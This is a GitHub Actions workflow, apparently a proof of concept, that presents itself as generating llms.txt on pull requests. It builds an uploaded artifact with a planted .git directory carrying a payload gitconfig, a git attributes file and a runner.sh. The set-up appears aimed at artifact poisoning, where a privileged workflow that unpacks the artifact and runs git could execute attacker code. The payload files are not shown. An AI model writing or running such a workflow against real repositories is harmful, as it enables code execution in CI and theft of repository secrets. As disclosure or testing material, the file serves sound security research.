---
name: Generate llms.txt
on:
  pull_request:
    branches: [main]

jobs:
  gen:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: make package
        run: |
          mkdir -p out/src/pages
          echo "generated llms content v2" > out/src/pages/llms.txt
          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
          echo "main" > out/pr-branch.txt
          git init -q repo
          (cd repo && git -c user.email=poc@example.invalid -c user.name=poc commit -q --allow-empty -m init)
          cp -a repo/.git out/.git
          cp payload/gitconfig out/.git/config
          mkdir -p out/.git/info
          cp payload/attrs out/.git/info/attributes
          cp payload/runner.sh out/.git/info/runner.sh
      - uses: actions/upload-artifact@v4
        with:
          name: llms-txt
          path: out/
          include-hidden-files: true
